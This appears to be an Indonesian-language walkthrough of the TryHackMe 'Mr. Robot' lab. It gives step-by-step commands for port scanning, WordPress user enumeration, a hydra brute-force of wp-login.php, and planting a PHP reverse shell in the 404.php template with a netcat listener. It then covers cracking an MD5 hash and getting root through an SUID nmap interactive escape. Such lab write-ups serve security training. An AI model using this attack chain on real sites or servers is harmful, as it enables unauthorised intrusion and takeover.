## 📘 Mr. Robot TryHackMe – Walkthrough Lengkap

**By:** \[username kamu di GitHub]
**Level:** Easy - Medium
**Platform:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

---

# ✅ PART 1 – ENUMERATION 🕵️‍♂️

### 🎯 Target:

Mendapatkan akses awal ke mesin dan menemukan `key-1-of-3.txt`.

---

## 🧾 1. Inisialisasi

* **IP Mesin:** `10.10.11.154` (contoh, sesuaikan dengan mesin kamu)
* Pastikan kamu sudah connect ke VPN TryHackMe
* Tools utama: `nmap`, `nikto`, `gobuster`, `hydra`, `wpscan` (opsional)

---

## 🔍 2. Nmap Scan

```bash
nmap -sS -sV -T4 -Pn -p- 10.10.11.154
```

📌 **Hasil penting:**

* Port 80: HTTP
* Port 443: HTTPS
* Port 22: SSH (belum bisa dipakai)

---

## 🌐 3. Buka Web & Lakukan Pemeriksaan Awal

Akses di browser:

```
http://10.10.11.154
```

📌 Ada halaman WordPress bertema Mr. Robot (fsociety).

View page source → kamu akan melihat file:

```
robots.txt
```

---

## 🗂️ 4. Cek robots.txt

```bash
curl http://10.10.11.154/robots.txt
```

📄 Output:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

✅ **Download filenya**:

```bash
wget http://10.10.11.154/fsocity.dic
wget http://10.10.11.154/key-1-of-3.txt
```

---

## 🔑 5. Flag Pertama: key-1-of-3.txt

```bash
cat key-1-of-3.txt
```

🎉 Kamu akan lihat flag pertama. Simpan ya!

---

## 🔍 6. Enumerasi Username WordPress

```bash
wpscan --url http://10.10.11.154 -e u
```

📌 Akan muncul:

```
Found user: elliot
```

---

## 🧨 7. Brute Force Login WordPress

Gunakan `fsocity.dic` sebagai wordlist:

```bash
hydra -l elliot -P fsocity.dic 10.10.11.154 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Dashboard"
```

✅ Setelah cukup lama, hasilnya:

```
[80][http-post-form] login: elliot   password: ER28-0652
```

---

## 🔐 8. Login ke WordPress

Akses:

```
http://10.10.11.154/wp-login.php
```

Gunakan:

* **Username:** elliot
* **Password:** ER28-0652

---

## 💣 9. Upload Reverse Shell via Plugin Editor

* Buka menu **Appearance > Editor**
* Pilih `404.php`
* Replace isinya dengan PHP reverse shell dari [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Ubah IP kamu (tun0) dan port, lalu simpan.

```php
$ip = 'YOUR_TUN0_IP';
$port = 4444;
```

---

## 📡 10. Jalankan Netcat Listener

```bash
nc -lvnp 4444
```

Lalu akses:

```
http://10.10.11.154/404.php
```

🎉 Kamu akan dapet reverse shell sebagai `www-data`.

---

## 📁 11. Stabilkan Shell (Opsional)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---


# ✅ PART 2 – USER PRIVILEGE ESCALATION 🧗‍♂️

### 🎯 Target:

* Dapatkan akses ke user `robot`
* Ambil `key-2-of-3.txt`

---

## 🔍 1. Cari User-User yang Ada di Sistem

Dari reverse shell kamu, cek isi `/home/`:

```bash
ls /home/
```

📌 Output:

```
robot
```

➡️ Artinya ada user bernama `robot`. Kita akan coba masuk ke akunnya.

---

## 🔍 2. Cek Isi Home User `robot`

```bash
ls -la /home/robot
```

📌 Output:

```
-r-------- 1 robot robot 33 Nov 13 2019 key-2-of-3.txt
-r-x------ 1 robot robot 39 Nov 13 2019 password.raw-md5
```

⚠️ Kita belum bisa baca `key-2-of-3.txt` karena sekarang kita masih user `www-data`.

Tapi kita bisa akses file `password.raw-md5`. Ambil dulu:

```bash
cat /home/robot/password.raw-md5
```

📌 Output:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Itu adalah **hash MD5**.

---

## 🔓 3. Crack Password Hash MD5

Gunakan CrackStation.net atau John The Ripper untuk crack hash:

📌 Pakai [https://crackstation.net](https://crackstation.net) dan masukkan:

```
c3fcd3d76192e4007dfb496cca67e13b
```

🔑 Hasil:

```
abcdefghijklmnopqrstuvwxyz
```

---

## 🔐 4. Login sebagai User `robot`

Kita tahu password-nya, jadi:

```bash
su robot
```

Saat diminta password, ketik:

```
abcdefghijklmnopqrstuvwxyz
```

---

✅ Kamu sekarang jadi user `robot` 🎉

Cek dengan:

```bash
whoami
```

Output:

```
robot
```

---

## 📁 5. Ambil Flag Kedua

```bash
cat /home/robot/key-2-of-3.txt
```

🎉 Flag kedua berhasil diambil!


---


# ✅ PART 3 – ROOT PRIVILEGE ESCALATION & FINAL FLAG 👑

### 🎯 Target:

* Escalate dari user `robot` menjadi `root`
* Ambil `key-3-of-3.txt`

---

## 🔎 1. Cek Hak Akses `sudo`

Pertama coba:

```bash
sudo -l
```

📌 Output:

```
robot is not in the sudoers file. This incident will be reported.
```

➡️ Artinya kita gak bisa pakai `sudo`. Gak masalah. Kita cari cara lain pakai **SUID** exploit.

---

## 🧰 2. Cari File SUID

SUID = file yang dijalankan dengan **hak akses owner** (biasanya root)

```bash
find / -perm -4000 -type f 2>/dev/null
```

📌 Output (cuplikan penting):

```
/usr/local/bin/nmap
```

❗ Ini menarik karena biasanya `nmap` tidak berada di `/usr/local/bin`. Kita cek apakah dia punya SUID:

```bash
ls -la /usr/local/bin/nmap
```

Output:

```
-rwsr-xr-x 1 root root 123456 Jan 1 2020 /usr/local/bin/nmap
```

➡️ Yup! Huruf `s` di `rws` menunjukkan bahwa **nmap ini dijalankan sebagai root**.

---

## 🧨 3. Gunakan Nmap untuk Dapatkan Root Shell

Jalankan versi interaktif dari Nmap:

```bash
/usr/local/bin/nmap --interactive
```

Akan muncul prompt:

```
nmap>
```

Ketik:

```bash
!sh
```

🎉 BOOM! Sekarang kamu **root shell**!

---

## 🔓 4. Cek Status

```bash
whoami
```

📌 Output:

```
root
```

🚀 Kamu sekarang root! Saatnya ambil flag terakhir.

---

## 🏁 5. Ambil Flag Terakhir

```bash
cat /root/key-3-of-3.txt
```

🎉 Dan kamu berhasil mendapatkan:

```
THM{...flag content...}
```

---

# 🏆 Challenge Selesai!

---

## 🔚 Ringkasan Flag:

| Flag           | Lokasi         | Catatan                     |
| -------------- | -------------- | --------------------------- |
| key-1-of-3.txt | `/robots.txt`  | Diakses dari web            |
| key-2-of-3.txt | `/home/robot/` | Butuh login ke user `robot` |
| key-3-of-3.txt | `/root/`       | Butuh akses root            |

---

## ✅ Tools yang Dipakai

| Tools      | Fungsi                      |
| ---------- | --------------------------- |
| `nmap`     | Network & port scan         |
| `gobuster` | Directory brute-forcing     |
| `hydra`    | Brute-force login WordPress |
| `wpscan`   | WordPress user enumeration  |
| `netcat`   | Reverse shell listener      |
| `find`     | Mencari file SUID           |

---

## 👨‍💻 Catatan Akhir

Challenge ini mengajarkan kamu tentang:

* Enumeration dasar web dan WordPress
* Brute force WordPress login
* Upload reverse shell via plugin editor
* Cracking MD5 hash
* Escalasi privilege dengan binary SUID (`nmap`)

---
